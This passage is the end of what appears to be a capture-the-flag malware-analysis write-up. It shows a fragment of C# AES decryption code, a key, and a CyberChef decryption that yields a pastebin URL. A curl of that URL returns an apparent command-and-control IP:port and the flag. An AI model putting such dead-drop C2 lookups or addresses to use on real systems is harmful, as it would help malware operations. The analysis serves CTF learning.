+</span><span style="color:#bf616a;">result </span><span>= </span><span style="color:#bf616a;">Convert</span><span>.</span><span style="color:#bf616a;">ToBase64String</span><span>(</span><span style="color:#bf616a;">cryptoTransform</span><span>.</span><span style="color:#bf616a;">TransformFinalBlock</span><span>(</span><span style="color:#bf616a;">array2</span><span>, </span><span style="color:#d08770;">0</span><span>, </span><span style="color:#bf616a;">array2</span><span>.</span><span style="color:#bf616a;">Length</span><span>));
+</span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">result</span><span>;
+</span></code></pre>
+<p>With a key of <code>f3758b11f3304f884564a6fb1548e5f3758b11f3304f884564a6fb1548e5d20</code>,
+decrypting <code>為公的敬顧管生人承導太希</code> via CyberChef (base64 decryption and AES/ECB
+decryption) yields: <code>https://pastebin.com/raw/uyNtUu9p</code>:</p>
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">❯</span><span> curl https://pastebin.com/raw/uyNtUu9p
+</span><span style="color:#bf616a;">98.184.49.53:8080
+</span><span style="color:#65737e;">#MetaCTF{Curs3s_c0mE_h0me_T0_rO0sT}
+</span></code></pre>
+
+
+        </main>
+        
+        <footer class="footer py-1 bg-light">
+    <div class="container text-end">
+        <small class="text-muted">© 2025 PsypherPunk</small>
+    </div>
+</footer>
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-gtEjrD/SeCtmISkJkNUaaKMoLD0//ElJ19smozuHV6z3Iehds+3Ulb9Bn9Plx0x4" crossorigin="anonymous"></script>
+    </body>
+</html>
